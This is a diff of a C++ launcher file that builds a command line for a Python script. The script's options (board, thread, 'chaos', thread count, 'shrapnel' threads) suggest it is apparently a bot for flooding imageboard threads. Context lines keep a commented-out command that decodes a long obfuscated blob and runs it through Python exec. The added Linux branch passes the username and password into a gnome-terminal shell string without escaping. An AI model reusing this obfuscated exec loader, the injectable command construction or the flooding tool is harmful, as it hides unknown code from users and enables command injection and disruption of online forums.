@@ -1,5 +1,6 @@
 #include "setup.h"
 #include <stdlib.h>
+#include <unistd.h>
 
 const string Setup::DIGITS = "0123456789";
 
@@ -299,10 +300,16 @@ string Setup::comline () {
 //    string command("python3 -c \"from base64 import b64decode; code = b64decode(\'");
 //    command += decode("J{NgMUpvJGOx\\Gmw\\|pgcZTnMVggMUpvBn\\{a\" g[nF|\\V[ JGmvbG){cBAjOkTl\\YOx\\GWLBnTm\\jA a FVS mKLDTMV!TKLVpLBWFVS mKJC gK{bLBgmna#JgbG)|JGmwJIKiancmLGzmajiDU )WUUlqPgpKBYmnJDTMV!TKY#Axb! gQV gK{@oPjAAW OKUU@tQU@oNBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK{DoPjAAW OKUU@tQU@oNUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK!yjK|pgSXOCUWlgL| gK|JoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbkK|pgSXOCUWlgL| gK|NoBglK\\Yzq\\jADU )WUXvya#OcJC )JBblK|pgSXOCUWlgL| gK|SoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbmK|pgSXOCUWlgL| gK|WoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbnK|pgSXOCUWlgL| gK|[oBglK\\Yzq\\jADU )WUXvya#OcJC )JBcbK{b&JDFVS mKJBu)JBb#KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oLBb&JDFVS mKJBu)JBb$KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oLUb&JDFVS mKJBu)JBb%KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSBb&JDFVS mKJBu)JBcAKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSUb&JDFVS mKJBu)JBcBKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSjb&JDFVS mKJBu)JBcCKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oS{b&JDFVS mKJBu)JBcDKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oTBb&JDFVS mKJBu)JBcFKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oTjb&JDFVS mKJBu)JBcGKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oT{b&JDFVS mKJBu)JBcIKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oUUb&JDFVS mKJBu)JBcJKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oUjb&JDFVS mKJBu)JBcKKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oU{b&JDFVS mKJBu)JBcLKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVBb&JDFVS mKJBu)JBcMKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVUb&JDFVS mKJBu)JBcNKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVjb&JDFVS mKJBu)JBcOKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oV{b&JDFVS mKJBu)JBcPKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oWBb&JDFVS mKJBu)JBcQKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oWUb&JDFVS mKJBu)JBcSKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oW{b&JDFVS mKJBu)JBcTKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXBb&JDFVS mKJBu)JBcUKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXUb&JDFVS mKJBu)JBcVKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXjb&JDFVS mKJBu)JBcWKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oX{b&JDFVS mKJBu)JBcXKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYBb&JDFVS mKJBu)JBcYKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYUb&JDFVS mKJBu)JBcZKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYjb&JDFVS mKJBu)JBc[KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oY{b&JDFVS mKJBu)JBc\\KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oZFyoPjAAW OKUU@tQU@oYjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"@oPjAAW OKUU@tQU@o[UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"DoPjAAW OKUU@tQU@o[jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"JoPjAAW OKUU@tQU@o[{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"NoPjAAW OKUU@tQU@o\\BbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"SoPjAAW OKUU@tQU@o\\UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"[oPjAAW OKUU@tQU@o\\jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"boPjAAW OKUU@tQU@o\\{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"loPjAAW OKUU@tQU@o`BbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"poPjAAW OKUU@tQU@o`UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"uoPjAAW OKUU@tQU@o`jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"yoPjAAW OKUU@tQU@o`{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\" oPjAAW OKUU@tQU@oaBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"$oPjAAW OKUU@tQU@oaUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"(oPjAAW OKUU@tQU@oajbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#@oPjAAW OKUU@tQU@oa{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#DoPjAAW OKUU@tQU@obBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#NoPjAAW OKUU@tQU@obUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#SoPjAAW OKUU@tQU@objbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#WoPjAAW OKUU@tQU@ob{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#[oPjAAW OKUU@tQU@ocBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#boPjAAW OKUU@tQU@ocUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#goPjAAW OKUU@tQU@ocjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#loPjAAW OKUU@tQU@oc{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#poPjAAW OKUU@tQU@odBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#uoPjAAW OKUU@tQU@odUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#yoPjAAW OKUU@tQU@odjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK|DoPjAAW OKUU@tQU@oL{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK|NoPjAAW OKUU@tQU@oM{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK|goPjAAW OKUU@tQU@oQUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK!zwK|pgSXOCUWlgL| gK!zwKypLBZKmcIX{ajAAW OKUSpLcIK%PgpKbGF cGX{aj@)JGJoUovP\\ !XbI\\LT )$ZFzIaZcbZIzy\\\"O`XG%OXncoVXXyclKxXIvlXoANSmmvcnKILZvkSlDg[FliaWKoaZFiYlF$[n)V\\\"JkaZzB\\\"!z[XqAdGKxW\"ckT\"m\'ZFz\\TnzgYUXxSncvbYF`SZija!Oo[FlpVDK\\aZ\\jT{m\'[ KAd!uoBgmka\"TmJC g[jboBgpK[nmw[ZJgQUAxbGXwLBc#`ZAmbj%mdGWoMBc{[jbqBgml[ZTiJC g[nmw[ZJwbnXi\\BgqBgmj`Y%ibj%kaG)|\\SpLBZAxb{@)JGTicGDw\\nmw\\Biy[ZT \\ZKwLSpK\\n){JIKxc{AqajA{[Y%o\\UgzOBl&BglK[\")l\\U@tQUAl[ZTiY#Axb|qya#NtN|WyNF LBSmya#NgL| gN|WyO@pK[\")l\\U@tQUAl[ZTiY#Axb|qya#NtNkbzNm LBgmka\"TmJC g[\")l\\U%l\\YOx\\GWpK\"F|[\"mqK{lLBYOx\\GWgQUA a FVS mKLGOx\\GWqBgmka\"TmJC g[k[ \\GXka\"TmLGOx\\GWqBgmka\"TmJC g[\")l\\U%l\\YOx\\GWpK#X \\j $K{lLBgmmdGXkLGOx\\GWqBgqmdGOmbISgTZik\\ZA `Y)wPgpKbIKqaoSpJnF{\\YzqcnWga\"Kxb#KiaIO%[UJqBgmqaoA!cBgqBg88");
 //    command += "\'); exec(code.decode('utf-8'))\" ";
-    string command("python3 main.py ");
-
+#ifdef __linux__
+    string command("gnome-terminal --window --command \"python3 main.py ");
+    command += ("-u \\\"" + username + "\\\" ");
+    command += ("--password \\\"" + password + "\\\" ");
+#else
+    string command("python main.py ");
     command += ("-u \"" + username + "\" ");
     command += ("--password \"" + password + "\" ");
+#endif
+
 
     command += ("-b " + board + " -t " + thread + " -c " + chaos + " -p " + potocksCount + " -d ");
     command += logMode;
@@ -353,6 +360,10 @@ string Setup::comline () {
     if (hasShrapnelCharge && !hasMinPostsCount)
         for (unsigned int i(0); i < shrapnelThreads.size(); i++)
             command += (" " + shrapnelThreads[i]);
+
+#ifdef __linux__
+    command += "\"";
+#endif
 
 ///    cout << command << endl << endl << endl << endl;
     return command;
